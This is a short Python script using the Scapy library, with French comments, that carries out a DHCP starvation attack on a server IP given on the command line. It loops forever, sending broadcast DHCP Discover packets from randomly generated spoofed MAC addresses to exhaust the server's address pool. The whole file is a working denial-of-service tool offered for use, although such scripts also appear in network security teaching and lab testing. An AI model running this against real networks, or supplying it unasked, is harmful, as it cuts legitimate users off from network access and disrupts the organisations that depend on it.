from scapy.all import *
import random

def random_mac():
    """Génère une adresse MAC aléatoire"""
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))

def dhcp_starvation(server_ip):
    """Lance une attaque DHCP Starvation"""
    print(f"Lancement de l'attaque DHCP Starvation sur le serveur {server_ip}...")

    while True:
        mac_address = random_mac()
        print(f"Adresse MAC aléatoire générée : {mac_address}")

        # Créer une trame Ethernet
        eth = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff")

        # Créer une trame IP et UDP
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)

        # Créer une requête DHCP Discover
        dhcp_discover = DHCP(options=[
            ("message-type", "discover"),
            ("server_id", server_ip),  # Serveur à attaquer
            ("end")
        ])

        # Paquet complet
        dhcp_request = eth / ip / udp / BOOTP(chaddr=mac_address) / dhcp_discover

        # Envoi du paquet
        sendp(dhcp_request, iface="enp0s3", verbose=1)  # Remplacez `enp0s3` par votre interface réseau

if __name__ == "__main__":
    import sys

    if len(sys.argv) != 2:
        print("Utilisation : sudo python3 dhcp_starvation.py <IP_SERVEUR_DHCP>")
        sys.exit(1)

    server_ip = sys.argv[1]
    dhcp_starvation(server_ip)
